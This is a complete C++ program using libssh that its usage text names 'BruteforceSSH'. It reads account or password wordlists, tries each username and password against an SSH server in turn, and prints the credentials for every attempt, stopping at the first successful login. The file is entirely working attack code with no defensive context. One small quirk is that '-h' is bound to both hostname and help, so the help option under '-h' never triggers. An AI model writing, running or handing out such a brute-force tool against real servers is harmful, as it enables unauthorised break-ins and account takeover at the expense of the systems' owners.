#include <libssh/libssh.h>

#include <fstream>
#include <iostream>
#include <sstream>
#include <string>

bool connect(const std::string &hostname, int port, const std::string &username, const std::string &password, int timeout) {
    ssh_session session = ssh_new();
    if (session == nullptr)
        return false;

    ssh_options_set(session, SSH_OPTIONS_USER, username.c_str());
    ssh_options_set(session, SSH_OPTIONS_HOST, hostname.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
    ssh_options_set(session, SSH_OPTIONS_HOSTKEYS, "ssh-ed25519,ssh-rsa,ssh-dss");

    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        std::cerr << "Error connecting to " << hostname << ": " << ssh_get_error(session) << std::endl;
        ssh_free(session);
        return false;
    }

    rc = ssh_userauth_password(session, nullptr, password.c_str());
    if (rc == SSH_AUTH_SUCCESS) {
        std::cout << "Success: " << username << ":" << password << std::endl;
        ssh_disconnect(session);
        ssh_free(session);
        return true;
    } else {
        std::cerr << "Failure: " << username << ":" << password << std::endl;
        ssh_disconnect(session);
        ssh_free(session);
        return false;
    }
}

bool connect_accounts(const std::string &filename, const std::string &hostname, int port, int timeout) {
    std::ifstream file(filename);
    std::string line;

    if (!file.is_open()) {
        std::cerr << "Failed to open accounts file: " << filename << std::endl;
        return false;
    }

    while (std::getline(file, line)) {
        std::istringstream iss(line);
        std::string username;
        std::string password;

        if (std::getline(iss, username, ':') && std::getline(iss, password)) {
            if (connect(hostname, port, username, password, timeout)) {
                return true;
            }
        }
    }
    return false;
}

bool connect_passwords(const std::string &filename, const std::string &username, const std::string &hostname, int port, int timeout) {
    std::ifstream file(filename);
    std::string line;

    if (!file.is_open()) {
        std::cerr << "Failed to open passwords file: " << filename << std::endl;
        return false;
    }

    while (std::getline(file, line)) {
        std::istringstream iss(line);
        std::string password;

        if (std::getline(iss, password)) {
            if (connect(hostname, port, username, password, timeout)) {
                return true;
            }
        }
    }
    return false;
}

int main(int argc, char *argv[]) {
    std::string filename_accounts;
    std::string filename_passwords;
    std::string username;
    std::string hostname = "127.0.0.1";
    int port = 22;
    int timeout = 30;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-a" || arg == "--accounts") {
            if (i + 1 < argc) {
                filename_accounts = argv[++i];
            } else {
                std::cerr << "--accounts option requires a filename argument." << std::endl;
                return 1;
            }
        } else if (arg == "-p" || arg == "--passwords") {
            if (i + 1 < argc) {
                filename_passwords = argv[++i];
            } else {
                std::cerr << "--passwords option requires a filename argument." << std::endl;
                return 1;
            }
        } else if (arg == "-u" || arg == "--username") {
            if (i + 1 < argc) {
                username = argv[++i];
            } else {
                std::cerr << "--username option requires a username argument." << std::endl;
                return 1;
            }
        } else if (arg == "-h" || arg == "--hostname") {
            if (i + 1 < argc) {
                hostname = argv[++i];
            } else {
                std::cerr << "--hostname option requires a hostname argument." << std::endl;
                return 1;
            }
        } else if (arg == "-P" || arg == "--port") {
            if (i + 1 < argc) {
                port = std::stoi(argv[++i]);
            } else {
                std::cerr << "--port option requires a port number argument." << std::endl;
                return 1;
            }
        } else if (arg == "-t" || arg == "--timeout") {
            if (i + 1 < argc) {
                timeout = std::stoi(argv[++i]);
            } else {
                std::cerr << "--timeout option requires a timeout value (seconds) argument." << std::endl;
                return 1;
            }
        } else if (arg == "--help" || arg == "-help" || arg == "-h") {
            std::cout << "Usage: BruteforceSSH [options]" << std::endl;
            std::cout << "Options:" << std::endl;
            std::cout << "  -a, --accounts <filename>  Accounts file" << std::endl;
            std::cout << "  -p, --passwords <filename> Passwords file" << std::endl;
            std::cout << "  -u, --username <username>   Username" << std::endl;
            std::cout << "  -h, --hostname <hostname>   Hostname (default: 127.0.0.1)" << std::endl;
            std::cout << "  -P, --port <port>           Port (default: 22)" << std::endl;
            std::cout << "  -t, --timeout <timeout>     Timeout (seconds, default: 30)" << std::endl;
            std::cout << "  --help                      Print help" << std::endl;
            return 0;
        } else {
            std::cerr << "Unknown option: " << arg << std::endl;
            return 1;
        }
    }

    if (!filename_accounts.empty()) {
        connect_accounts(filename_accounts, hostname, port, timeout);
    } else if (!filename_passwords.empty() && !username.empty()) {
        connect_passwords(filename_passwords, username, hostname, port, timeout);
    } else {
        std::cerr << "You must specify either an accounts file or a passwords file with a username." << std::endl;
        std::cout << "Use --help for usage information." << std::endl;
        return 1;
    }

    return 0;
}
